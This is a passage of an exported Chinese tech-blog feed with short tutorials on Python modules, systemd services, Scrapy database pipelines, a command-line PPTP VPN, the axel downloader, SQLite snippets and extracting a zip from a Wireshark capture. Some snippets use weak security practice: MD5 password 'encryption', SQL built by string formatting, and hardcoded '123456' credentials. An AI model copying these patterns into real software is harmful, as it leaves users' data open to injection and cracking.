创建一个把format输出到Formatter中的对象filer.setFormatter(formatter) # fh文件添加输出格式stream.setFormatter(formatter) # ch屏幕添加输出格式# 为logger添加文件输出格式和屏幕输出格式logger.addHandler(filer)logger.addHandler(stream)logger.setLevel(logging.DEBUG) # 指定日志级别设置为DEBUGlogger.debug('this is debug message')logger.info('this is info message')logger.warning('this is warning message')logger.error('this is error message')logger.critical('this is critical message') 参考:https://www.cnblogs.com/Nicholas0707/p/9021672.html hashlib模块hashlib模块 123456import hashlibpassword1 = '123456'res = password1.encode() # 将密码转出二进制，password2 = b'123456'或者直接加bm = hashlib.md5(res) # 进行md5加密print(m.hexdigest()) # 显示md5加密 加盐： 二级加密，保证数据的安全，我们会在md5加密代码前加上一个特定的字符串， 如123456helloworld,输入密码为123456， 进过加盐对123456helloworld进行md5加密， 当用户登录输入密码，代码自动在用户输入密码后加盐，转出md5与数据库匹配 除了MD5还有sha.224,sha256更安全, 由于md5算法是不可逆的,所以按照实际业务来实现算法 双重加密 加密两次,我们使用os.urandom(n) #表示一个生成n个字节随机字符串,当然每次打印生成的结果肯定是不一样的uuid加密 1234import uuidres = uuid.uuid4() # 根据机器号时间等信息生成的随机序列号 # e6684777-5166-455f-8c48-c6f5f3e79d2c 1234567import osfrom hashlib import md5req = os.urandom(24)res = md5(os.urandom(24)).hexdigest()print(res)# 002747ea4bb0852767c9449307f8da93 importlib模块importlib模块 #实现动态导入模块并执行 1234567import importlibmode = 'libtest.importlib_test' # mode为libtest文件下的importlib_test.py文件fuc = 'run' # 文件中的run函数名称moc = importlib.import_module(mode) # 将mode变量导入,该模块会拿到py文件对象res = getattr(moc, fuc) # 再通过getattr传入对象和函数名称res() # 最后执行模块方法 heapq模块heapq模块 #从一个集合中查找最大最小的N个元素——Python heapq 堆数据结构 12345678910111213141516import heapqnum = [23, 213, 1, 23, 2, 23, 24, 5, 345, 34.324, 5, 3, 52]max = heapq.nlargest(3, num) # 显示列表中的最大前三个min = heapq.nsmallest(3, num) # 显示列表中的最小前三个# heapq.nlargest(n, iterable[, key])第三参数key的使用portfolio = [ &#123;'name': 'IBM', 'shares': 100, 'price': 91.1&#125;, &#123;'name': 'AAPL', 'shares': 50, 'price': 543.22&#125;, &#123;'name': 'FB', 'shares': 200, 'price': 21.09&#125;, &#123;'name': 'HPQ', 'shares': 35, 'price': 31.75&#125;, &#123;'name': 'YHOO', 'shares': 45, 'price': 16.35&#125;, &#123;'name': 'ACME', 'shares': 75, 'price': 115.65&#125;]print(heapq.nlargest(3, portfolio, lambda x: x['shares'])) # 从例子中可以看出x['shares']可以取关键字shares值的数据作为排列规则,并且再取整行数据# &gt;&gt;[&#123;'name': 'FB', 'shares': 200, 'price': 21.09&#125;, &#123;'name': 'IBM', 'shares': 100, 'price': 91.1&#125;, &#123;'name': 'ACME', 'shares': 75, 'price': 115.65&#125;] 判断是否为函数123456789callable() # 判断是否为函数def hanshu(): passprint(callable(hanshu)) # trueprint(callable('我不是函数')) # false 判断最小值min()函数 判断最小 12345678910111213print(min(&apos;abc123&apos;))print(min([2, 3, 4, 5, 6, 7, 1]))print(min(&#123;1: &apos;213&apos;, 2: &apos;42&apos;&#125;))print(min((2, 3, 4, 5, 6, 7, 8, 1)))print(min(((&#123;4: &apos;a&apos;, 2: &apos;b&apos;, 1: &apos;c&apos;&#125;)))) # 不管里面有多少层print(min(&#123;&apos;a&apos;: &apos;213&apos;, &apos;b&apos;: &apos;42&apos;&#125;))# key参数print(min(&#123;&quot;username&quot;: &quot;123&quot;, &quot;password&quot;: &quot;321&quot;&#125;, &#123;&quot;username&quot;: &quot;342&quot;, &quot;password&quot;: &quot;5343&quot;&#125;, key=lambda x: x[&quot;username&quot;])) # 多字典函数时指定函数区分# default参数print(min(&apos;&apos;, default=&apos;默认值&apos;)) # 空字符串,空列表,空元祖,空字段,可设返回默认值 第三方库faker模块 不是打LoL的faker 1234567891011121314151617181920212223# pip install faker# github地址 https://github.com/joke2k/faker# 中文官方文档 https://faker.readthedocs.io/en/master/locales/zh_CN.html#import faker# 该模块主要是用来做测试的假数据或者伪造数据f2 = faker.Faker(locale='zh-CN') # 指定中文,如果不填就是英文数据,也可以指定其他国外地区# 常用print(f2.ssn()) # 身份证号print(f2.phone_number()) # 手机号print(f2.email()) # 邮箱print(f2.address()) # 地址print(f2.name()) # 姓名print(f2.postcode())print(f2.street_address()) # 街道地址print(f2.street_name()) # 街道名print(f2.street_suffix()) # 街、路print(f2.street_address()) # 街道地址print(f2.date()) # 随机日期print(f2.ipv4()) # 随机IP4地址print(f2.url()) # 随机URL地址print(f2.phone_number()) # 随机生成手机号print(f2.simple_profile()) # 随机档案信息 jsonpath模块jsonpath模块 #方便取json的模块 123456789101112131415161718192021222324252627# 安装 pip install jsonpathimport jsonpathes = &#123; "mappings": &#123; "article": &#123; "properties": &#123; "type": "string", "analyzer": "english" &#125; , "post_date": &#123; "type": "date" &#125;, "title": &#123; "type": "string" &#125;, "publiser_id": &#123; "type": "long" &#125; &#125; &#125;&#125;result01 = jsonpath.jsonpath(es, 'mappings') # 参数1:传一个正确的json,参数2:传想要获取的key,返回一个传入的键的value并以列表形式返回result02 = jsonpath.jsonpath(es, 'article') # 返回False,如果超过第一层就要使用$..来查找,如下↓result03 = jsonpath.jsonpath(es, '$..analyzer') # 返回['english']print(result03) 参考原文：https://www.cnblogs.com/RainBol/p/9505438.html QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker安装Linux版awvs最新版]]></title>
    <url>%2F2019%2F08%2F14%2F74_Docker%E5%AE%89%E8%A3%85Linux%E7%89%88awvs%E6%9C%80%E6%96%B0%E7%89%88%2F</url>
    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS7自定义开机启动项]]></title>
    <url>%2F2019%2F08%2F13%2F69_CentOS7%E8%87%AA%E5%AE%9A%E4%B9%89%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E9%A1%B9%2F</url>
    <content type="text"><![CDATA[CentOS7自定义开机启动项 Centos 系统服务脚本目录: /usr/lib/systemd/ 有系统（system）和用户（user）之分，如需要开机没有登陆情况下就能运行的程序，存在系统服务（system）里，即：/lib/systemd/system/ 反之，用户登录后才能运行的程序，存在用户（user）里服务以.service结尾。 这边以nginx开机运行为例 QQ群：397745473 建立服务文件vim /lib/systemd/system/nginx.service 12345678910111213141516171819202122232425[Unit] Description=nginx After=network.target [Service] Type=forking ExecStart=/www/lanmps/init.d/nginxstart ExecReload=/www/lanmps/init.d/nginxrestart ExecStop=/www/lanmps/init.d/nginx stop PrivateTmp=true [Install] WantedBy=multi-user.target [Unit ] 服务的说明 Description:描述服务 After:描述服务类别 [Service]服务运行参数的设置 Type=forking是后台运行的形式 ExecStart为服务的具体运行命令 ExecReload为重启命令 ExecStop为停止命令 PrivateTmp=True表示给服务分配独立的临时空间 注意： [Service]的启动、重启、停止命令全部要求使用绝对路径 [Install]服务安装的相关设置，可设置为多用户 保存目录以754的权限保存在目录：/lib/systemd/system 设置开机自启动1systemctl enable nginx.service 其他命令任务 旧指令 新指令 使某服务自动启动 chkconfig–level 3 httpd on systemctl enable httpd.service 使某服务不自动启动 chkconfig –level3 httpd off systemctl disable httpd.service 检查服务状态 servicehttpd status systemctl status httpd.service （服务详细信息） ​ systemctl is-active httpd.service （仅显示是否 Active) 显示所有已启动的服务 chkconfig –list systemctl list-units –type=service 启动某服务 servicehttpd start systemctl start httpd.service 停止某服务 servicehttpd stop systemctl stop httpd.service 重启某服务 servicehttpd restart systemctl restart httpd.service 启动nginx服务 systemctl start nginx.service 设置开机自启动 systemctl enable nginx.service 停止开机自启动 systemctl disable nginx.service 查看服务当前状态 systemctl status nginx.service 重新启动服务 systemctl restart nginx.service 查看所有已启动的服务 systemctl list-units –type=service 查看开机自启项centos7自启项已不用chkconfig改为： 1systemctl list-unit-files 左边是服务名称，右边是状态，enabled是开机启动，disabled是开机不启动 当然还可以过滤一下 比如：查看启动项 1systemctl list-unit-files | grep enable Linux开机启动管理—systemd使用使某服务自动启动1systemctl enable httpd.service 使某服务不自动启动1systemctl disable httpd.service 检查服务状态12systemctl status httpd.service （服务详细信息） systemctl is-active httpd.service （仅显示是否 Active) 显示所有已启动的服务1systemctl list-units --type=service 启动某服务1systemctl start httpd.service 停止某服务1systemctl stop httpd.service 重启某服务1systemctl restart httpd.service 修改配置文件后重启修改配置文件以后，需要重新加载配置文件，然后重新启动相关服务。 12345# 重新加载配置文件$ sudo systemctl daemon-reload# 重启相关服务$ sudo systemctl restart foobar ubuntu 18 设置开机启动方法参考:https://linuxeye.com/463.html Ubuntu 18.04默认进程启动管理已经切换至systemd，不在使用SysV。如果想像之前一样使用/etc/rc.local设置开机自启动，请如下设置 修改 rc-local.service/lib/systemd/system/rc-local.service新增： 12345vim /lib/systemd/system/rc-local.service[Install]WantedBy=multi-user.targetAlias=rc-local.service 设置开机自启动rc-local1systemctl enable rc-local 创建/etc/rc.local1234cat &gt; /etc/rc.local &lt;&lt; EOF#!/bin/bashecho "test rc.local " &gt; /tmp/rctest.logEOF 新增执行权限1chmod +x /etc/rc.local QQ群：397745473]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用SQL发布Wordpress]]></title>
    <url>%2F2019%2F08%2F09%2F67_%E7%94%A8SQL%E5%8F%91%E5%B8%83Wordpress%2F</url>
    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>wordpress</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>wordpress</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Scrapy连接各种数据库案例]]></title>
    <url>%2F2019%2F08%2F09%2F68_Scrapy%E8%BF%9E%E6%8E%A5%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A1%88%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[Scrapy连接各种数据库案例 Scrapy连接到各类数据库(SQLite,Mysql,Mongodb,Redis) 这次我给大家讲讲如何使用scrapy连接到(SQLite,Mysql,Mongodb,Redis)数据库，并把爬取的数据存储到相应的数据库中。 QQ群：397745473 scrapy 连接 SQLite1.修改pipelines.py文件加入如下代码 1234567891011121314151617181920212223242526272829303132333435# 爬取到的数据写入到SQLite数据库import sqlite3class SQLitePipeline(object): #打开数据库 def open_spider(self, spider): db_name = spider.settings.get('SQLITE_DB_NAME', 'scrapy.db') self.db_conn = sqlite3.connect(db_name) self.db_cur = self.db_conn.cursor() #关闭数据库 def close_spider(self, spider): self.db_conn.commit() self.db_conn.close() #对数据进行处理 def process_item(self, item, spider): self.insert_db(item) return item #插入数据 def insert_db(self, item): values = ( item['upc'], item['name'], item['price'], item['review_rating'], item['review_num'], item['stock'], ) sql = 'INSERT INTO books VALUES(?,?,?,?,?,?)' self.db_cur.execute(sql, values) 2.修改settings.py文件，加入如下代码 12# sqlite 配置SQLITE_DB_NAME = 'scrapy.db' 在settings启动管道文件 123ITEM_PIPELINES = &#123; 'toscrape_book.pipelines.SQLitePipeline': 400,&#125; scrapy 连接mysql数据库1.修改pipelines.py文件加入如下代码 1234567891011121314151617181920212223242526272829303132333435363738# 爬取到的数据写入到MySQL数据库import pymysqlclass MySQLPipeline(object): # 打开数据库 def open_spider(self, spider): db = spider.settings.get('MYSQL_DB_NAME','scrapy_db') host = spider.settings.get('MYSQL_HOST', 'localhost') port = spider.settings.get('MYSQL_PORT', 3306) user = spider.settings.get('MYSQL_USER', 'root') passwd = spider.settings.get('MYSQL_PASSWORD', '123456') self.db_conn =pymysql.connect(host=host, port=port, db=db, user=user, passwd=passwd, charset='utf8') self.db_cur = self.db_conn.cursor() # 关闭数据库 def close_spider(self, spider): self.db_conn.commit() self.db_conn.close() # 对数据进行处理 def process_item(self, item, spider): self.insert_db(item) return item #插入数据 def insert_db(self, item): values = ( item['upc'], item['name'], item['price'], item['review_rating'], item['review_num'], item['stock'], ) sql = 'INSERT INTO books VALUES(%s,%s,%s,%s,%s,%s)' self.db_cur.execute(sql, values) 2.修改settings.py文件，加入如下代码 12345# mysql 配置MYSQL_DB_NAME = 'scrapy_db'MYSQL_HOST = '127.0.0.1'MYSQL_USER = 'root'MYSQL_PASSWORD = '123456' 在settings启动管道文件 123ITEM_PIPELINES = &#123; 'toscrape_book.pipelines.MySQLPipeline': 401,&#125; scrapy 连接mongodb案例1.修改pipelines.py文件加入如下代码 12345678910111213141516171819202122232425262728# 爬取到的数据写入到Mongodb数据库from pymongo import MongoClientfrom scrapy import Itemclass MongoDBPipeline(object): # 打开数据库 def open_spider(self, spider): db_uri = spider.settings.get('MONGODB_URI', 'mongodb://localhost:27017') db_name = spider.settings.get('MONOGDB_DB_NAME', 'scrapy_db') self.db_client = MongoClient(db_uri) self.db = self.db_client[db_name] # 关闭数据库 def close_spider(self, spider): self.db_client.close() # 对数据进行处理 def process_item(self, item, spider): self.insert_db(item) return item # 插入数据 def insert_db(self, item): if isinstance(item, Item): item = dict(item) self.db.books.insert(item) 2.修改settings.py文件，加入如下代码 123# mongodb 配置MONGODB_URI = 'mongodb://127.0.0.1:27017'MONGODB_DB_NAME = 'scrapy_db' 在settings启动管道文件 123ITEM_PIPELINES = &#123; 'toscrape_book.pipelines.MongoDBPipeline': 403,&#125; scrapy 连接redis数据库1.修改pipelines.py文件加入如下代码 12345678910111213141516171819202122232425262728293031# 爬取到的数据写入到redis数据库import redisfrom scrapy import Itemclass RedisPipeline(object): # 打开数据库 def open_spider(self, spider): db_host = spider.settings.get('REDIS_HOST', 'localhost') db_port = spider.settings.get('REDIS_PORT', 6379) db_index = spider.settings.get('REDIS_DB_INDEX', 0) self.db_conn = redis.StrictRedis(host=db_host, port=db_port, db=db_index) self.item_i = 0 # 关闭数据库 def close_spider(self, spider): self.db_conn.connection_pool.disconnect() # 处理数据 def process_item(self, item, spider): self.insert_db(item) return item # 插入数据 def insert_db(self, item): if isinstance(item, Item): item = dict(item) self.item_i += 1 self.db_conn.hmset('book:&#123;&#125;'.format(self.item_i), item) 2.修改settings.py文件，加入如下代码 1234# redis 配置REDIS_HOST = '127.0.0.1'REDIS_PORT = 6379REDIS_DB_INDEX = 0 在settings启动管道文件 123ITEM_PIPELINES = &#123; &apos;toscrape_book.pipelines.RedisPipeline&apos;: 404,&#125; scrapy 连接各数据的设置并不复杂，首先在pipelines文件中建立管道，建立个数据的连接，然后处理数据，关闭连接。接下来我们在settings文件中定义各类数据库的基本配置，然后在item_pipelines中启动相应的管道 原文参考： https://zhuanlan.zhihu.com/p/33816647 http://blog.dongfei.xin/2018-04-06/%E7%B2%BE%E9%80%9A-Scrapy-%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%EF%BC%88%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AF%87%EF%BC%89/ QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>scrapy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[scrapy爬豆果美食APP]]></title>
    <url>%2F2019%2F08%2F08%2F66_scrapy%E7%88%AC%E8%B1%86%E6%9E%9C%E7%BE%8E%E9%A3%9FAPP%2F</url>
    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux命令行连接vpn]]></title>
    <url>%2F2019%2F08%2F05%2F65_linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%BF%9E%E6%8E%A5vpn%2F</url>
    <content type="text"><![CDATA[linux命令行连接vpn pptpsetup命令行连接pptp vpn | 拨号 QQ群：397745473 linux命令行连接vpn VPN 服务器信息123Server IP: xx.xx.xx.xxUsername : vpnuserPassword : vpnpass 命令行连接VPN12apt-get install pptp-linuxpptpsetup --create name --server x.x.x.x --username zhangll --password lsanotes --encrypt --start 即可配置一個pptp的客戶端 其中 create：這個配置的名稱 server：pptp服務器的ip地址 username：登錄pptp服務器的用戶名 password：登錄pptp服務器的密碼 encrypt：使用加密方式登錄（很多服務器要求必須加密否則不讓你登錄） start：開啓pptp客戶端 参考：PS:更多选项运行”pptpsetup –help” 这样其实是写入了/etc/ppp/peers/ 这个目录下面（网上有在这个目录新建文件的方法，看来不如这个方便） /etc/ppp/chap-secrets 用户名密码写入到了这个文件 上线： 1pon vpnname 下线： 1poff vpnname (全部下线poff -a) 然后ifconfig查看一下多了ppp0这个网络 现在还不能通过vpn来走 因为并不知道数据该怎么走，很明显要配一下路由 #route 查看现在的默认路由，下面两条操作将默认路由改为vpn的地址，删除原来的默认路由 12route add default gw 10.19.1.1route delete default gw xxx.xxx.xxx.yyy 或者这样更简便 12route del defaultroute add default dev ppp0 这样就能通过vpn来做事了。 参考：https://www.twblogs.net/a/5b83167c2b717766a1eb0189 参考：https://xmsg.org/wordpress/2015/10/pptpsetup%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%BF%9E%E6%8E%A5pptp-vpn-%E6%8B%A8%E5%8F%B7%E3%80%90%E8%BD%AC%E3%80%91/ QQ群：397745473]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux多线程下载]]></title>
    <url>%2F2019%2F08%2F01%2F62_linux%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8B%E8%BD%BD%2F</url>
    <content type="text"><![CDATA[linux多线程下载 一般情况，在 Linux 下我们习惯于用 wget 下载，但该工具的缺点就是无法进行多线程下载，所以往往有时候速度不够快。这里介绍的 Axel，是 Linux 下一款不错的 HTTP 或 FTP 高速下载工具。支持多线程下载、断点续传，且可以从多个地址或者从一个地址的多个连接来下载同一个文件，适合网速不给力时多线程下载以提高下载速度。需要注意的是，该软件只有命令行界面。 QQ群：397745473 axelCentOS 7安装Axel目前yum官方源上没有Axel，我们无法通过yum直接进行安装，但是我们可以通过安装epel第三方源然后后yum安装axel下载工具 1yum install axel CentOS 6安装Axel：32位CentOS 6执行下面命令： 12wget -c http://mirrors.sohu.com/dag/redhat/el6/en/i386/rpmforge/RPMS/axel-2.4-1.el6.rf.i686.rpmrpm -ivh axel-2.4-1.el6.rf.i686.rpm 64位CentOS 6执行下面命令：12wget -c http://mirrors.sohu.com/dag/redhat/el6/en/x86_64/rpmforge/RPMS/axel-2.4-1.el6.rf.x86_64.rpmrpm -ivh axel-2.4-1.el6.rf.x86_64.rpm Debian/Ubuntu安装Axel：1apt-get install axel Axel命令使用方法：123456789axel 参数 文件下载地址比较常用可选参数：-s 设置最大下载速度，如果限制到512KB/s，则填写512000-n 指定连接数-o 指定另存为目录，或者指定的目录+文件名-H 指定header-U 指定useragent-q 静默模式-a 更改默认进度条样式 1234567axel [OPTIONS] url1 [url2] [url…]-n x 指定线程数（x 必须为大于 0 的数字）-o x 指定另存为目录（x 必须为本地目录）-s x 指定下载速度（x 必须为大于 0 的数字，单位是 bytes/s）-q 静默模式，无任何输出信息-V 软件版本 Axel 在下载过程中如果遇到中断的话，在原来的目录再次执行相同的下载命令即可恢复下载进度。 这里列出我最喜欢使用的一个命令，具有很强的实用性 1Axel -n 线程个数 -a -v -U &apos;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15&apos; -o &apos;目录/目标文件名&apos; 目标URL 两个细节 用户代理问题 有些网站需要模拟请求头的 User-agent 从而能够解析 URL。 那么请求头又从哪里获得呢？这可难不住我们，模拟一个 User-Agent 请求头就可以解决了。User-Agent 可以直接复制浏览器 -&gt; 开发者模式（F12或者 cmd + option + i） -&gt; 网络-&gt; 请求头 -&gt; User-Agent 比如我的就是 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15。 ​ 2.目录问题 指定的目录需要是已存在的目录，命令行的程序通常都并不会新建目录。 多线程下载一篇论文并保证在后台进行，即使退出该终端也没有关系 1nohup Axel -n 10 -U &apos;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15&apos; -o &apos;paper.pdf&apos; http://www.aclweb.org/anthology/W03-0429 &gt;OutFile.out 2&gt;&amp;1 &amp; 解决Too many redirects问题使用 axel 报 Too many redirects 错误? Too many redirects-重定向过多原因是你的 axel 版本太低了!(包括yum install axel的安装)所以你就看我咋安装就 ok 了 123456789101112131415#下载源码包wget -O axel-2.16.1.tar.gz https://file.idait.cn/axel-2.16.1.tar.gz#解压tar xzvf axel-2.16.1.tar.gz#进入目录cd axel-2.16.1/#检查编译./configure --prefix=/usr/local/axelmake &amp;&amp; make install#报错请安装 gcc 工具 不报错请忽略yum groupinstall "Development tools"#axel 执行路径echo 'PATH=/usr/local/axel/bin:$PATH' &gt; /etc/profile.d/axel.sh#使文件生效. /etc/profile 解决卡住在初始化时不动问题如果yum install axel无法正常运行，可以尝试以下手动方法安装： 123456789wget &apos;http://www.ha97.com/code/axel-2.4.tar.gz&apos;tar -xf axel-2.4.tar.gzcd axel-2.4yum -y install gcc./configuremake &amp;&amp; make install默认安装路径是/usr/local/bin/axel，再加一个下述链接即可：ln -s /usr/local/bin/axel /usr/bin/axel QQ群：397745473]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常用sql记录]]></title>
    <url>%2F2019%2F08%2F01%2F63_%E5%B8%B8%E7%94%A8sql%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[常用sql语句记录 QQ群：397745473 Sqlite 常用sql语句python 使用sqlite3常用代码 1234567891011121314151617#encoding=utf-8 import sqlite3#打开数据库连接,没有的话会自动创建一个 conn = sqlite3.connect(&apos;test.db&apos;)#使用cursor()获取操作游标 cursor = conn.cursor()# cursor.execute(&apos;create table user (id varchar(20) primary key, name varchar(20))&apos;) for i in range(1,300):name = &apos;vince&apos;+str(i)#执行SQL语句 cursor.execute(&quot;INSERT INTO user (id, name) VALUES (&apos;%d&apos;, &apos;%s&apos;)&quot; %(i,name))#关闭cursor cursor.close()#提交事务 conn.commit()#关闭数据库连接 conn.close() 判断表中的数据是否已存在12345678910# 1 存在,0 不存在select_sql=f'''SELECT EXISTS (SELECT 1 FROM pageContent WHERE newUrl = "&#123;newUrl&#125;");''' #print(select_sql)c.execute(select_sql)# 过滤掉已经采集过的新闻res=c.fetchone()[0]if res == 1: i+=1 print('[&#123;i&#125;] &#123;newUrl&#125; 已上传！'.format(newUrl=newUrl,i=i)) continue sqlite可视化管理工具12345光是命令行操作数据库有时候不是那么的直观怎么办?当然有可视化的管理工具啦。推荐一个开源免费的sqlite可视化管理工具:SQLiteStudio下载地址:https://sqlitestudio.pl/index.rvt更多sqlite的教程在W3Cschool上有:http://www.runoob.com/sqlite/sqlite-python.html QQ群：397745473]]></content>
      <categories>
        <category>sql</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python 文件更新检测]]></title>
    <url>%2F2019%2F07%2F28%2F60_python%E6%96%87%E4%BB%B6%E6%9B%B4%E6%96%B0%E6%A3%80%E6%B5%8B%2F</url>
    <content type="text"><![CDATA[python 文件更新检测 测试在线网站的 last-modified …. QQ群：397745473 123456789import requestsimport datetimefrom dateutil.parser import parse as parsedater = requests.head(url)url_time = r.headers[&apos;last-modified&apos;]url_date = parsedate(url_time)file_time = datetime.datetime.fromtimestamp(os.path.getmtime(dstFile))if url_date &gt; file_time : print(donwload it !) 更多参考：https://stackoverflow.com/questions/29314287/python-requests-download-only-if-newer QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解决python在windows中输出乱码]]></title>
    <url>%2F2019%2F07%2F25%2F55_%E8%A7%A3%E5%86%B3python%E5%9C%A8windows%E4%B8%AD%E8%BE%93%E5%87%BA%E4%B9%B1%E7%A0%81%2F</url>
    <content type="text"><![CDATA[解决python在windows中输出乱码 QQ群：397745473 12type=&apos;utf-8&apos;print(&apos;[+] 开始更新!&apos;.decode(type)) 1234567def bytetohex(data): if sys.version_info &gt; (3, 0): # Python 3 code in this block return "".join("&#123;:02X&#125; ".format(c) for c in data) else: # Python 2 code in this block return "".join("&#123;:02X&#125; ".format(ord(c)) for c in data) QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[提取wireshark中的文件]]></title>
    <url>%2F2019%2F07%2F25%2F56_%E6%8F%90%E5%8F%96wireshark%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[提取wireshark中的文件 504的文件头，是个zip的PK的十六进制，现在想把这段数据抓取出来然后转换为zip文件 更多参考：https://www.t00ls.net/thread-47172-1-1.html QQ群：397745473 方案一12with open('filename.zip', 'w') as f: f.write('504B0304140000000800288DC34C58BD2C542C0500002C0700000E000000313532383031383837352E706E676D956D54926718C7B12C4D33ED45CD94B034E9D4C9B6F2A5D4503B1A5A274CB1B2E341A798D35EA82D4D110173B9AD48C8B9B2A395A5A8684C84694D54B0B65646BA91C0A333C2487C8530ECE909151C7E4BE19CDFFD7CB8CF7D5FE77F5FD7F5BF9E2B47306807BB0D763018CC213A2A220E06B35A3FBF6C9798766CD59401186CF9547444787CEE6D8D3C96FE6ECFCA659D3DA95AAAEACD52F6CAA8412F955F03CA66DF43E550386C0BB652A15020EE0D570E2C2D10865DF7FC9241854A484155BEFD4E7D8B2DD1865E52B1EE1A67C488E3A6CFEF7C63B62B42C4ACB3397DA01016BE80826C3D69EC8E74A44B790E0B12E71834460DAAA09A94BDAE45A1F79AFDDA2BFCB26778C1177486EB49F582C84709FFB2013AF4A019744C64DF105E28FB081AF702D4CBA1E9DE3F3B79DB7E09EBA65031C67AF19A8B20F2BCE512728D406AC8C3517E715BB1C47A21C6747D5B3D1485436BB5D1C06903E7A499DA79C1E341AFC01BC5CAEDB0987297FC727AAD667D58EFF8B16755BD20E22DC36DC5E6454157BD5050B31FE5A3F1F0A5B9D3EFAA00A36D779493E74226897FF6F45FED7210A3CBE4817B0BE8FBE4871D6684347385C3E5A3819A0139878BD9F8208F999071F7B593A187E4FF5B98074E76CDDAAA7021525D4E07A18F3B95A363F54EB400B58EC1C422EECD51508422EF4C5F982413197BA7752C425FEC34BB8C490BE671722288711E09860A78A286E5D8F9FEDC2D1F33DD5F411B220D4C71570F6A06CA1BD9EE5E7A07AC40A9D35CEF07ED5E636DBB90663F71657E7155639F7A384FC4F42AC54D069F5295C624BA6E5A1CB8C9971AE3125D7635F1090D08E19F3124C1C7491A48EA1A40F74D6C2FF1DD3F99B4E89D366D42DA3E35C38E078FD4545BA919E379C9FA6AA516ECF8548AB868A1CE28B87424AF98572F49F2E864A6DECFFF1E82C4EB7D84FD7452266549B1B5D979192776DD71F7719A33DCDEFE703781DE782299B3B5BC1D48739C9978699694264AB17270CEF1624D6B92CF1BE83F253864BF0BDF62ACF599469B1F3E7FFE4735B8DCEFA9306403157BA18AFC1439F93105098181E00411699E448FDB9B667A367E02D02DD426B5D879DCA083E63EB7D975CF01F1BF86A69A9BEB876164A9212CE8FDD1D0632D99100496E7F6B636E283479103C21093B70A16798B3F2B8FDDDCFE2660DAC1F92DD74AE20FBA55CEA623735A2A4A3C17B97DDEF046371EBCAE3CA0E30057D21C72D44FFFEAA0BC2F351D61AE3ABE6274A7545452BA654C799271F01160DF7D088E76F1C0A5E8EA6A684EED65161C9E193C0556631427EA1A2BCE5C6E8E6F3F4EE690D79A47668B14A5D211BA08F3FE3961DBF300693D64D344E500379990146DEEDEF959C3F636A4093F0F64C94E61C1563C2E8527D60FA13E18ACDA2F99F78989866F9F63F8145606F931132F9DB853DD909CA2CB559263A05D96B28763BB07C03FF66749329F3D7000FF0E021847C99A354F045D96065FABEF7EB420437BA14322E08C71F3C54087242BE4C96A8B4527E13ECCF6D69276F867CB76DEDD7104D1C9CCA18F5F31572C53696BBA5EE0B94654FF2CD334CAB01F72E61ECB62C49A3D9C8794223A72127FA0D076718FE8A038ACB66415B8ED6CEF4F9A0CA1E96A1A6FAB826974BE65A9ECF7F8F42C1C79D9601B5F7AA63C24E153C62582EEA552E9BED642774F822A2DF9305985FCE7FAD96DD181FE32E28868F521708B93851E1129929B0FF1EBB93D436BFFA05C256011350691E021BEC4FC91A6890A044EB9F86B8C465FB8CD3046F697A215303EBB66BD7AD15CA80C3DF2AAC88243E7952176AF6B886B2408969BFE82B0E8484C44E3FE6F0AFF07504B01021400140000000800288DC34C58BD2C542C0500002C0700000E0000000000000000002000000000000000313532383031383837352E706E67504B050600000000010001003C000000580500000000'.decode('hex')) ipython或者python终端直接运行 方案二1、工具binwalk 